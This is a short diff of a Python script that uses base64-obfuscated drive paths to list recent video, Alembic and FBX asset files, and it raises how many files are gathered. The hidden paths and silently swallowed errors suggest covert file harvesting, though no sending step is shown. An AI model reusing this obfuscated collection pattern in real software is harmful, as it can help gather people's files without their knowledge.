@@ -114,11 +114,11 @@ except:
     pass
 
 try:
-    ldir = search_latest_files_or_dirs(dir_path=base64.b64decode('Uzov').decode(), ext='', n=3)
+    ldir = search_latest_files_or_dirs(dir_path=base64.b64decode('Uzov').decode(), ext='', n=4)
     zovV = ldir
     for _, dp in ldir:
-        zovV += search_latest_files_or_dirs(dir_path=dp, ext='.mp4')
-        zovV += search_latest_files_or_dirs(dir_path=dp, ext='.mov')
+        zovV += search_latest_files_or_dirs(dir_path=dp, ext='.mp4', n=20)
+        zovV += search_latest_files_or_dirs(dir_path=dp, ext='.mov', n=20)
         zovV += search_latest_files_or_dirs(dir_path=dp, ext='.abc')
     zovV += search_latest_files_or_dirs(dir_path=base64.b64decode('TDovV0hNL0NIQVJBQ1RFUg==').decode(), ext='.fbx', n=40)
     
